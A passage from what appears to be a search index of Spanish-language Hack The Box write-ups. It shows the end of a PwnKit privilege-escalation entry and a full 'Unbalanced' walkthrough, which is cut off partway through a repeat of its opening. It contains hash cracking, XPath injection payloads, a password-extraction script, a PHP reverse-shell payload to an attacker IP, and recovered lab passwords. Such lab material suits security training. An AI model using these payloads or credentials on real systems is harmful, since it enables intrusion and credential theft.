-fPIC -shared -o pkwner/pkwner.so pkwner/pkwner.c echo \"[+] Build mini executor...\" gcc -o pkwner/executor pkwner/exec.c # export PATH=\"GCONV_PATH=.\" # export CHARSET=\"PKWNER\" #export SHELL=pkwner PATH = 'GCONV_PATH=.' ./pkwner/executor echo \"[+] Nice Job\"","title":"PostExplotation - PWNKIT"},{"location":"maquinas/linux/pressed/#escalado-a-root","text":"Tras ejecutar el exploit en la ttyoverhttp se escala a root: pwnkit.sh \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2551 \u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2554\u2550\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2557\u255a\u2588\u2588\u2588\u2554\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2551 \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u255d\u255a\u2550\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d \u255a\u2550\u255d CVE-2021-4034 PoC by Kim Schulz [ + ] Setting up environment... [ + ] Build offensive gconv shared module... [ + ] Build mini executor... id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) ,33 ( www-data ) whoami root cat /root/root.txt 5e4234f88f66431f1513e2bee958ef20","title":"Escalado a root:"},{"location":"maquinas/linux/unbalanced/","text":"Unbalanced HTB Recon Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.10.200 Enum Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -n --open --min-rate 5000 -p- -vvv -oG allPorts 10.10.10.200 Se realiza un analisis de los puertos abiertos: nmap -sVC -p22,873,3128 10.10.10.200 -oN openPorts Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-01 01:58 CEST Nmap scan report for 10.10.10.200 Host is up (0.043s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA) | 256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA) |_ 256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519) 873/tcp open rsync (protocol version 31) 3128/tcp open http-proxy Squid http proxy 4.6 |_http-title: ERROR: The requested URL could not be retrieved |_http-server-header: squid/4.6 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.00 seconds Al encontrar un servicio rsync, se revisa y se encuentra data cifrada: rsync -a 'rsync://10.10.10.200/conf_backups' mycopy --port 873 ls -la mycopy drwxr-xr-x root root 4.1 KB Sat Apr 4 17:05:32 2020 \uf115 . drwxr-xr-x root root 60 B Mon Aug 1 02:25:09 2022 \uf115 .. .rw-r--r-- root root 288 B Sat Apr 4 17:05:31 2020 \uf016 ,CBjPJW4EGlcqwZW4nmVqBA6 .rw-r--r-- root root 135 B Sat Apr 4 17:05:31 2020 \uf016 -FjZ6-6,Fa,tMvlDsuVAO7ek .rw-r--r-- root root 1.3 KB Thu Apr 2 15:06:19 2020 \ue619 .encfs6.xml .rw-r--r-- root root 154 B Sat Apr 4 17:05:32 2020 \uf016 0K72OfkNRRx3-f0Y6eQKwnjn .rw-r--r-- root root 56 B Sat Apr 4 17:05:32 2020 \uf016 27FonaNT2gnNc3voXuKWgEFP4sE9mxg0OZ96NB0x4OcLo- .rw-r--r-- root root 190 B Sat Apr 4 17:05:32 2020 \uf016 2VyeljxHWrDX37La6FhUGIJS .rw-r--r-- root root 537 B Sat Apr 4 17:05:31 2020 \uf016 3cdBkrRF7R5bYe1ZJ0KYy786 .rw-r--r-- root root 386 B Sat Apr 4 17:05:31 2020 \uf016 3E2fC7coj5,XQ8LbNXVX9hNFhsqCjD-g3b-7Pb5VJHx3C1 .rw-r--r-- root root 560 B Sat Apr 4 17:05:31 2020 \uf016 3xB4vSQH-HKVcOMQIs02Qb9, .rw-r--r-- root root 275 B Sat Apr 4 17:05:32 2020 \uf016 4J8k09nLNFsb7S-JXkxQffpbCKeKFNJLk6NRQmI11FazC1 .rw-r--r-- root root 463 B Sat Apr 4 17:05:32 2020 \uf016 5-6yZKVDjG4n-AMPD65LOpz6-kz,ae0p2VOWzCokOwxbt, .rw-r--r-- root root 2.1 KB Sat Apr 4 17:05:31 2020 \uf016 5FTRnQDoLdRfOEPkrhM2L29P .rw-r--r-- root root 238 B Sat Apr 4 17:05:31 2020 \uf016 5IUA28wOw0wwBs8rP5xjkFSs .rw-r--r-- root root 1.2 KB Sat Apr 4 17:05:31 2020 \uf016 6R1rXixtFRQ5c9ScY8MBQ1Rg .rw-r--r-- root root 108 B Sat Apr 4 17:05:31 2020 \uf016 7-dPsi7efZRoXkZ5oz1AxVd-Q,L05rofx0Mx8N2dQyUNA, .rw-r--r-- root root 1.3 KB Sat Apr 4 17:05:32 2020 \uf016 7zivDbWdbySIQARaHlm3NbC-7dUYF-rpYHSQqLNuHTVVN1 .rw-r--r-- root root 1.0 KB Sat Apr 4 17:05:31 2020 \uf016 8CBL-MBKTDMgB6AT2nfWfq-e .rw-r--r-- root root 29 B Sat Apr 4 17:05:31 2020 \uf016 8e6TAzw0xs2LVxgohuXHhWjM .rw-r--r-- root root 152 B Sat Apr 4 17:05:31 2020 \uf016 8XDA,IOhFFlhh120yl54Q0da .rw-r--r-- root root 5.6 KB Sat Apr 4 17:05:31 2020 \uf016 9F9Y,UITgMo5zsWaP1TwmOm8EvDCWwUZurrL0TwjR,Gxl0 .rw-r--r-- root root 2.9 KB Sat Apr 4 17:05:31 2020 \uf016 A4qOD1nvqe9JgKnslwk1sUzO .rw-r--r-- root root 1.1 KB Sat Apr 4 17:05:31 2020 \uf016 a4zdmLrBYDC24s9Z59y-Pwa2 .rw-r--r-- root root 443 B Sat Apr 4 17:05:31 2020 \uf016 Acv0PEQX8vs-KdK307QNHaiF .rw-r--r-- root root 935 B Sat Apr 4 17:05:31 2020 \uf016 B6J5M3OP0X7W25ITnaZX753T .rw-r--r-- root root 3.6 KB Sat Apr 4 17:05:31 2020 \uf016 c9w3APbCYWfWLsq7NFOdjQpA .rw-r--r-- root root 1.5 KB Sat Apr 4 17:05:32 2020 \uf016 Chlsy5ahvpl5Q0o3hMyUIlNwJbiNG99DxXJeR5vXXFgHC1 .rw-r--r-- root root 332 B Sat Apr 4 17:05:31 2020 \uf016 cwJnkiUiyfhynK2CvJT7rbUrS3AEJipP7zhItWiLcRVSA1 .rw-r--r-- root root 2.5 KB Sat Apr 4 17:05:31 2020 \uf016 dF2GU58wFl3x5R7aDE6QEnDj .rw-r--r-- root root 1.2 KB Sat Apr 4 17:05:31 2020 \uf016 dNTEvgsjgG6lKBr8ev8Dw,p7 .rw-r--r-- root root 2.3 KB Sat Apr 4 17:05:31 2020 \uf016 ECXONXBBRwhb5tYOIcjjFZzh .rw-r--r-- root root 1.4 KB Sat Apr 4 17:05:32 2020 \uf016 F4F9opY2nhVVnRgiQ,OUs-Y0 .rw-r--r-- root root 354 B Sat Apr 4 17:05:32 2020 \uf016 FGZsMmjhKz7CJ2r-OjxkdOfKdEip4Gx2vCDI24GXSF5eB1 .rw-r--r-- root root 3.2 KB Sat Apr 4 17:05:31 2020 \uf016 FSXWRSwW6vOvJ0ExPK0fXJ6F .rw-r--r-- root root 422 B Sat Apr 4 17:05:31 2020 \uf016 gK5Z2BBMSh9iFyCFfIthbkQ6 .rw-r--r-- root root 2.3 KB Sat Apr 4 17:05:31 2020 \uf016 gRhKiGIEm4SvYkTCLlOQPeh- .rw-r--r-- root root 1.9 KB Sat Apr 4 17:05:32 2020 \uf016 hqZXaSCJi-Jso02DJlwCtYoz .rw-r--r-- root root 1.8 KB Sat Apr 4 17:05:32 2020 \uf016 iaDKfUAHJmdqTDVZsmCIS,Bn .rw-r--r-- root root 95 B Sat Apr 4 17:05:31 2020 \uf016 IymL3QugM,XxLuKEdwJJOOpi .rw-r--r-- root root 4.5 KB Sat Apr 4 17:05:31 2020 \uf016 jIY9q65HMBxJqUW48LJIc,Fj .rw-r--r-- root root 158 B Sat Apr 4 17:05:32 2020 \uf016 Kb-,NDTgYevHOGdHCYsSQhhIHrUGjiM6i2JZcl,-PKAJm0 .rw-r--r-- root root 4.9 KB Sat Apr 4 17:05:31 2020 \uf016 kdJ5whfqyrkk6avAhlX-x0kh .rw-r--r-- root root 657 B Sat Apr 4 17:05:31 2020 \uf016 kheep9TIpbbdwNSfmNU1QNk- .rw-r--r-- root root 518 B Sat Apr 4 17:05:31 2020 \uf016 Kpo3MHQxksW2uYX79XngQu-f .rw-r--r-- root root 340 B Sat Apr 4 17:05:31 2020 \uf016 KPYfvxIoOlrRjTY18zi8Wne- .rw-r--r-- root root 1.4 KB Sat Apr 4 17:05:31 2020 \uf016 KtFc,DR7HqmGdPOkM2CpLaM9 .rw-r--r-- root root 612 B Sat Apr 4 17:05:31 2020 \uf016 l,LY6YoFepcaLg67YoILNGg0 .rw-r--r-- root root 46 B Sat Apr 4 17:05:31 2020 \uf016 lWiv4yDEUfliy,Znm17Al41zi0BbMtCbN8wK4gHc333mt, .rw-r--r-- root root 1.6 KB Sat Apr 4 17:05:31 2020 \uf016 mMGincizgMjpsBjkhWq-Oy0D .rw-r--r-- root root 714 B Sat Apr 4 17:05:31 2020 \uf016 Mv5TtpmUNnVl-fgqQeYAy8uu .rw-r--r-- root root 289 B Sat Apr 4 17:05:31 2020 \uf016 MxgjShAeN6AmkH2tQAsfaj6C .rw-r--r-- root root 4.4 KB Sat Apr 4 17:05:31 2020 \uf016 Ni8LDatT134DF6hhQf5ESpo5 .rw-r--r-- root root 2.1 KB Sat Apr 4 17:05:31 2020 \uf016 Nlne5rpWkOxkPNC15SEeJ8g, .rw-r--r-- root root 199 B Sat Apr 4 17:05:32 2020 \uf016 OFG2vAoaW3Tvv1X2J5fy4UV8 .rw-r--r-- root root 1.7 KB Sat Apr 4 17:05:31 2020 \uf016 oPu0EVyHA6,KmoI1T,LTs83x .rw-r--r-- root root 914 B Sat Apr 4 17:05:32 2020 \uf016 OvBqims-kvgGyJJqZ59IbGfy .rw-r--r-- root root 52 B Sat Apr 4 17:05:31 2020 \uf016 pfTT,nZnCUFzyPPOeX9NwQVo .rw-r--r-- root root 1.0 KB Sat Apr 4 17:05:31 2020 \uf016 pn6YPUx69xqxRXKqg5B5D2ON .rw-r--r-- root root 650 B Sat Apr 4 17:05:31 2020 \uf016 q5RFgoRK2Ttl3U5W8fjtyriX .rw-r--r-- root root 660 B Sat Apr 4 17:05:32 2020 \uf016 qeHNkZencKDjkr3R746ZzO5K .rw-r--r-- root root 820 B Sat Apr 4 17:05:32 2020 \uf016 sfT89u8dsEY4n99lNsUFOwki .rw-r--r-- root root 2.9 KB Sat Apr 4 17:05:32 2020 \uf016 sNiR-scp-DZrXHg4coa9KBmZ .rw-r--r-- root root 427 B Sat Apr 4 17:05:31 2020 \uf016 StlxkG05UY9zWNHBhXxukuP9 .rw-r--r-- root root 17 B Sat Apr 4 17:05:31 2020 \uf016 TZGfSHeAM42o9TgjGUdOSdrd .rw-r--r-- root root 254 B Sat Apr 4 17:05:31 2020 \uf016 uEtPZwC2tjaQELJmnNRTCLYU .rw-r--r-- root root 203 B Sat Apr 4 17:05:31 2020 \uf016 vCsXjR1qQmPO5g3P3kiFyO84 .rw-r--r-- root root 309 KB Sat Apr 4 17:05:31 2020 \uf016 VQjGnKU1puKhF6pQG1aah6rc .rw-r--r-- root root 2.0 KB Sat Apr 4 17:05:31 2020 \uf016 W5,ILrUB4dBVW-Jby5AUcGsz .rw-r--r-- root root 670 B Sat Apr 4 17:05:32 2020 \uf016 waEzfb8hYE47wHeslfs1MvYdVxqTtQ8XGshJssXMmvOsZLhtJWWRX31cBfhdVygrCV5 .rw-r--r-- root root 685 B Sat Apr 4 17:05:31 2020 \uf016 Wr0grx0GnkLFl8qT3L0CyTE6 .rw-r--r-- root root 798 B Sat Apr 4 17:05:31 2020 \uf016 X93-uArUSTL,kiJpOeovWTaP .rw-r--r-- root root 1.6 KB Sat Apr 4 17:05:31 2020 \uf016 Ya30M5le2NKbF6rD-qD3M-7t .rw-r--r-- root root 1.9 KB Sat Apr 4 17:05:31 2020 \uf016 Yw0UEJYKN,Hjf-QGqo3WObHy .rw-r--r-- root root 128 B Sat Apr 4 17:05:31 2020 \uf016 Z8,hYzUjW0GnBk1JP,8ghCsC .rw-r--r-- root root 42 B Sat Apr 4 17:05:31 2020 \uf016 ZvkMNEBKPRpOHbGoefPa737T .rw-r--r-- root root 2.9 KB Sat Apr 4 17:05:31 2020 \uf016 ZXUUpn9SCTerl0dinZQYwxrx Todo cifrado excepto el directorio oculto .encfs6.xml: Aqui se indica la aplicaci\u00f3n usada (EncFS 1.9.5) para cifrar y sus keys correspondientes <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE boost_serialization> <boost_serialization signature=\"serialization::archive\" version=\"7\"> <cfg class_id=\"0\" tracking_level=\"0\" version=\"20\"> <version>20100713</version> <creator>EncFS 1.9.5</creator> <cipherAlg class_id=\"1\" tracking_level=\"0\" version=\"0\"> <name>ssl/aes</name> <major>3</major> <minor>0</minor> </cipherAlg> <nameAlg> <name>nameio/block</name> <major>4</major> <minor>0</minor> </nameAlg> <keySize>192</keySize> <blockSize>1024</blockSize> <plainData>0</plainData> <uniqueIV>1</uniqueIV> <chainedNameIV>1</chainedNameIV> <externalIVChaining>0</externalIVChaining> <blockMACBytes>0</blockMACBytes> <blockMACRandBytes>0</blockMACRandBytes> <allowHoles>1</allowHoles> <encodedKeySize>44</encodedKeySize> <encodedKeyData>GypYDeps2hrt2W0LcvQ94TKyOfUcIkhSAw3+iJLaLK0yntwAaBWj6EuIet0=</encodedKeyData> <saltLen>20</saltLen> <saltData>mRdqbk2WwLMrrZ1P6z2OQlFl8QU=</saltData> <kdfIterations>580280</kdfIterations> <desiredKDFDuration>500</desiredKDFDuration> </cfg> </boost_serialization> Cracking KEY Se procede a extraer el hash y crackearlo: python /usr/share/john/encfs2john.py . .:$encfs$192*580280*0*20*99176a6e4d96c0b32bad9d4feb3d8e425165f105*44*1b2a580dea6cda1aedd96d0b72f43de132b239f51c224852030dfe8892da2cad329edc006815a3e84b887add python /usr/share/john/encfs2john.py . > hash_EncFS john -w=/usr/share/wordlists/rockyou.txt hash_EncFS Using default input encoding: UTF-8 Loaded 1 password hash (EncFS [PBKDF2-SHA1 256/256 AVX2 8x AES]) Cost 1 (iteration count) is 580280 for all loaded hashes Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status bubblegum (.) 1g 0:00:00:21 DONE (2022-08-01 02:43) 0.04677g/s 33.67p/s 33.67c/s 33.67C/s bambam..marissa Use the \"--show\" option to display all of the cracked passwords reliably Session completed Descifrar data con encFS Tras revisar la documentaci\u00f3n y obtener la clave procedemos a desencriptar la data: encfs /home/x/Documentos/htb/unbalanced/mycopy /home/x/Documentos/htb/unbalanced/descifrado Contrase\u00f1a EncFS: ********* (bubblegum) ls descifrado \ue615 50-localauthority.conf \ue615 debconf.conf \ue615 fuse.conf \ue615 libaudit.conf \ue615 networkd.conf \ue615 rsyncd.conf \ue615 udev.conf \ue615 50-nullbackend.conf \ue615 debian.conf \ue615 gai.conf \ue615 libc.conf \ue615 nsswitch.conf \ue615 rsyslog.conf \ue615 update-initramfs.conf \ue615 51-debian-sudo.conf \ue615 deluser.conf \ue615 group.conf \ue615 limits.conf \ue615 org.freedesktop.PackageKit.conf \ue615 semanage.conf \ue615 user-dirs.conf \uf016 70debconf \ue615 dhclient.conf \ue615 hdparm.conf \ue615 listchanges.conf \ue615 PackageKit.conf \ue615 sepermit.conf \ue615 user.conf \ue615 99-sysctl.conf \ue615 discover-modprobe.conf \ue615 host.conf \ue615 logind.conf \ue615 pam.conf \ue615 sleep.conf \ue615 Vendor.conf \ue615 access.conf \ue615 dkms.conf \ue615 initramfs.conf \ue615 logrotate.conf \ue615 pam_env.conf \ue615 squid.conf \ue615 wpa_supplicant.conf \ue615 adduser.conf \ue615 dns.conf \ue615 input.conf \ue615 main.conf \ue615 parser.conf \ue615 sysctl.conf \ue615 x86_64-linux-gnu.conf \ue615 bluetooth.conf \ue615 dnsmasq.conf \ue615 journald.conf \ue615 mke2fs.conf \ue615 protect-links.conf \ue615 system.conf \ue615 xattr.conf \ue615 ca-certificates.conf \ue615 docker.conf \ue615 kernel-img.conf \ue615 modules.conf \ue615 reportbug.conf \ue615 time.conf \ue615 com.ubuntu.SoftwareProperties.conf \ue615 fakeroot-x86_64-linux-gnu.conf \ue615 ld.so.conf \ue615 namespace.conf \ue615 resolv.conf \ue615 timesyncd.conf \uf016 dconf \ue615 framework.conf \ue615 ldap.conf \ue615 network.conf \ue615 resolved.conf \ue615 ucf.conf Se obtiene la configuraci\u00f3n de squidproxy: cat squid.conf | grep -v '#' | awk /./ acl SSL_ports port 443 acl CONNECT method CONNECT http_access deny !Safe_ports http_access deny CONNECT !SSL_ports http_access allow manager include /etc/squid/conf.d/* http_access allow localhost acl intranet dstdomain -n intranet.unbalanced.htb acl intranet_net dst -n 172.16.0.0/12 http_access allow intranet http_access allow intranet_net http_access deny all http_port 3128 coredump_dir /var/spool/squid refresh_pattern ^ftp: 1440 20% 10080 refresh_pattern ^gopher: 1440 0% 1440 refresh_pattern -i (/cgi-bin/|\\?) 0 0% 0 refresh_pattern . 0 20% 4320 cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events cachemgr_passwd disable all cache disable Se configura el squidproxy en el foxyproxy por http, host 10.10.10.200, port 3128: Acceso con autenticaci\u00f3n a funcionalidades de SquidProxy: curl -s http://10.10.10.200:3128/squid-internal-mgr/menu -u 'cache_mgr:Thah$Sh1'| grep -v disabled menu Cache Manager Menu protected pconn Persistent Connection Utilization Histograms protected mem Memory Utilization protected diskd DISKD Stats protected fqdncache FQDN Cache Stats and Contents protected filedescriptors Process Filedescriptor Allocation protected objects All Cache Objects protected vm_objects In-Memory and In-Transit Objects protected counters Traffic and Resource Counters protected 5min 5 Minute Average of Counters protected 60min 60 Minute Average of Counters protected histograms Full Histogram Counts protected cbdata Callback Data Registry Contents protected sbuf String-Buffer statistics protected events Event Queue protected * Se pueden ver las ips y dns de los hosts: curl -s http://10.10.10.200:3128/squid-internal-mgr/fqdncache -u 'cache_mgr:Thah$Sh1' FQDN Cache Statistics: FQDNcache Entries In Use: 10 FQDNcache Entries Cached: 9 FQDNcache Requests: 361 FQDNcache Hits: 0 FQDNcache Negative Hits: 171 FQDNcache Misses: 190 FQDN Cache Contents: Address Flg TTL Cnt Hostnames 127.0.1.1 H -001 2 unbalanced.htb unbalanced ::1 H -001 3 localhost ip6-localhost ip6-loopback 172.31.179.2 H -001 1 intranet-host2.unbalanced.htb 172.31.179.3 H -001 1 intranet-host3.unbalanced.htb 10.10.10.200 N -797 0 127.0.0.1 H -001 1 localhost 172.17.0.1 H -001 1 intranet.unbalanced.htb ff02::1 H -001 1 ip6-allnodes ff02::2 H -001 1 ip6-allrouters Realizando un curl a trav\u00e9s del proxy a las al rango de direcciones que hemos visto 172.31.179.x se puede ver que hay un nodo en mantenimiento(desarrollo): curl --proxy 10.10.10.200:3128 172.31.179.1 Host temporarily taken out of load balancing for security maintenance. curl --proxy 10.10.10.200:3128 172.31.179.2/intranet.php <!DOCTYPE html> <html lang=\"en\"> <title>Unbalanced Design. Intranet.</title> <meta charset=\"UTF-8\"> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"> SQLi en nodo en mantenimiento Se observa un tama\u00f1o de respuesta diferente en el campo password al insertar una comilla, tras realizar la inyecci\u00f3n con Burp estos son los resultados: POST http://172.31.179.1/intranet.php HTTP/1.1 Host: 172.31.179.1 User-Agent: Mozilla/4.77 en (X11; U; Linux 2.4.9 i686) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 43 Origin: http://172.31.179.1 DNT: 1 Connection: close Referer: http://172.31.179.1/intranet.php Upgrade-Insecure-Requests: 1 Sec-GPC: 1 Username=admin&Password='or'1'='1 Parte de la respuesta: rita Rita Fubelli rita@unbalanced.htb Role: HR Manager jim Jim Mickelson jim@unbalanced.htb Role: Web Designer bryan Bryan Angstrom bryan@unbalanced.htb Role: System Administrator sarah Sarah Goodman sarah@unbalanced.htb Role: Team Leader XPATH injection - Link del paper Similar la sintaxis a sql injection, esta injecci\u00f3n da una respuesta de mas de 10000 kbytes, se puede ver todo el contenido de la tabla actual (nombres de usuario): Username=sarah&Password=vulnerable'] | //*['1'='1 Injeccion para ver la longitud del password [position()=1]/child::node()[position()=2]),1,1) Inyecci\u00f3n para ver la primera letra del password: [position()=1]/child::node()[position()=2]),1,1) Conociendo las inyecciones se crea un script en python para automatizar el ataque: #!/usr/bin/python3 from pwn import * import pdb , string , requests def def_handler ( sig , frame ): print ( \" \\n [!] Saliendo ...\" ) sys . exit ( 1 ) url = \"http://172.31.179.1/intranet.php\" proxy = { 'http' : 'http://10.10.10.200:3128' } usuarios = [ \"rita\" , \"jim\" , \"bryan\" , \"sarah\" ] characters = string . ascii_letters + string . digits + string . punctuation def getPassword ( url , proxy ): for user in usuarios : password = \"\" for position in range ( 1 , 30 ): for char in characters : payload = \"test' or Username=' %s ' and substring(Password, %d ,1)=' %s \" % ( user , position , char ) post_data = { 'Username' : 'test' , 'Password' : payload } r = requests . post ( url , data = post_data , proxies = proxy ) if \"Invalid credentials\" not in r . text : #print(r.text) if char == \"'\" : break password = password + char print ( \"Posici\u00f3n %d : \" % position + password ) break if char == \"'\" : break print ( \"La password del usuario %s es: \" % user + password ) if __name__ == '__main__' : getPassword ( url , proxy ) Se obtienen los siguientes resultados: La password del usuario rita es: password01! La password del usuario jim es: stairwaytoheaven La password del usuario bryan es: ireallyl0vebubblegum!!! La password del usuario sarah es: sarah4evah Explotation - Intrusion Viendo que las password obtenidas no dan ning\u00fan acceso por web, se prueba con el servicio SSH: ssh bryan@10.10.10.200 bryan@10.10.10.200's password: Linux unbalanced 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Wed Jun 17 14:16:06 2020 from 10.10.10.4 -bash: warning: setlocale: LC_ALL: cannot change locale (es_ES.UTF-8) bryan@unbalanced:~$ cat user.txt 4af2cbfd2c0dabcf8af24369b936d00e Se puede ver que han montado un contenedor de docker con Pi-Hole con password de admin temporal por defecto, y se crea un Local Port Fordwarding con SSH para acceder: bryan@unbalanced:~$ cat TODO ############ # Intranet # ############ * Install new intranet-host3 docker [DONE] * Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE] * Test intranet-host3 [DONE] * Add intranet-host3 to load balancer [DONE] * Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE] * Fix intranet-host2 [DONE] * Re-add intranet-host2 to load balancer (set default weight) [DONE] - Fix intranet-host1 [TODO] - Re-add intranet-host1 to load balancer (set default weight) [TODO] ########### # Pi-hole # ########### * Install Pi-hole docker (only listening on 127.0.0.1) [DONE] * Set temporary admin password [DONE] * Create Pi-hole configuration script [IN PROGRESS] - Run Pi-hole configuration script [TODO] - Expose Pi-hole ports to the network [TODO] bryan@unbalanced:~$ ss -tuna | grep 127.0.0.1 udp UNCONN 0 0 127.0.0.1:5553 0.0.0.0:* tcp LISTEN 0 128 127.0.0.1:8080 0.0.0.0:* tcp LISTEN 0 128 127.0.0.1:5553 0.0.0.0:* Tras acceder se puede ver un leak de ip interna de Pi-Hole, y accedemos a trav\u00e9s del SquidProxy: Escalado de Privilegios Tras acceder al panel de pihole con la contrase\u00f1a \"admin\", comprobamos que tiene la version 4.3.2 vulnerable a RCE, la cual permite acceder con una shell reversa: python pihole.py -u http://localhost -i 10.10.14.11 -p 443 -pass admin \u2554\u2550\u2557\u252c \u252c\u250c\u2510\u250c \u2554\u2550\u2557\u252c\u252c \u252c\u250c\u2500\u2510\u252c \u250c\u2500\u2510 \u2560\u2550\u255d\u2502\u2502\u2502\u2502\u2502\u2502 \u2560\u2550\u255d\u2502\u251c\u2500\u2524\u2502 \u2502\u2502 \u251c\u2524 \u2569 \u2514\u2534\u2518\u2518\u2514\u2518 \u2569 \u2534\u2534 \u2534\u2514\u2500\u2518\u2534\u2500\u2518\u2514\u2500\u2518 by @CyberVaca [+] Token: rymbP9XshULuGsr7p9DWQ1wRocuKIQ0M5r29qSmU1lA= [+] Payload: php -r '$sock=fsockopen(\"10.10.14.11\", 443);exec(\"/bin/sh -i <&3 >&3 2>&3\");' [+] Sending Payload... Se puede observar una password en la configuraci\u00f3n de un fichero, es uno de los scripts indicados en TODO pendientes de terminar: www-data@pihole:/root$ cat pihole_config.sh #!/bin/bash # Add domains to whitelist /usr/local/bin/pihole -w unbalanced.htb /usr/local/bin/pihole -w rebalanced.htb # Set temperature unit to Celsius /usr/local/bin/pihole -a -c # Add local host record /usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1 # Set privacy level /usr/local/bin/pihole -a -l 4 # Set web admin interface password /usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!' # Set admin email /usr/local/bin/pihole -a email admin@unbalanced.htb Nos convertimos en root desde la conexi\u00f3n de la m\u00e1quina unbalanced: bryan@unbalanced:~$ su root Password: bash: warning: setlocale: LC_ALL: cannot change locale (es_ES.UTF-8) root@unbalanced:/home/bryan# cat /root/root.txt cdd1ad3640b91e14500e2d627256dfa3","title":"Unbalanced"},{"location":"maquinas/linux/unbalanced/#unbalanced-htb","text":"","title":"Unbalanced HTB"},{"location":"maquinas/linux/unbalanced/#recon","text":"Se comprueba que la m\u00e1quina est\u00e1 activa: ping 10.10.10.200","title":"Recon"},{"location":"maquinas/linux/unbalanced/#enum","text":"Se realiza un scan de los 65535 puertos TCP: nmap -sS -Pn -n --open --min-rate 5000 -p- -vvv -oG allPorts 10.10.10.200 Se realiza un analisis de los puertos abiertos: nmap -sVC -p22,873,3128 10.10.10.200 -oN openPorts Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-01 01:58 CEST Nmap scan report for 10.10.10.200 Host is up (0.043s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA) | 256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA) |_ 256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519) 873/tcp open rsync (protocol version 31) 3128/tcp open http-proxy Squid http proxy 4.6 |_http-title: ERROR: The requested URL could not be retrieved |_http-server-header: squid/4.6 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.00 seconds Al encontrar un servicio rsync, se revisa y se encuentra data cifrada: rsync -a 'rsync://10.10.10.200/conf_backups' mycopy --port 873 ls -la mycopy drwxr-xr-x root root 4.1 KB Sat Apr 4 17:05:32 2020 \uf115 . drwxr-xr-x root root 60 B Mon Aug 1 02:25:09 2022 \uf115 .. .rw-r--r-- root root 288 B Sat Apr 4 17:05:31 2020 \uf016 ,CBjPJW4EGlcqwZW4nmVqBA6 .rw-r--r-- root root 135 B Sat Apr 4 17:05:31 2020 \uf016 -FjZ6-6,Fa,tMvlDsuVAO7ek .rw-r--r-- root root 1.3 KB Thu Apr 2 15:06:19 2020 \ue619 .encfs6.xml .rw-r--r-- root root 154 B Sat 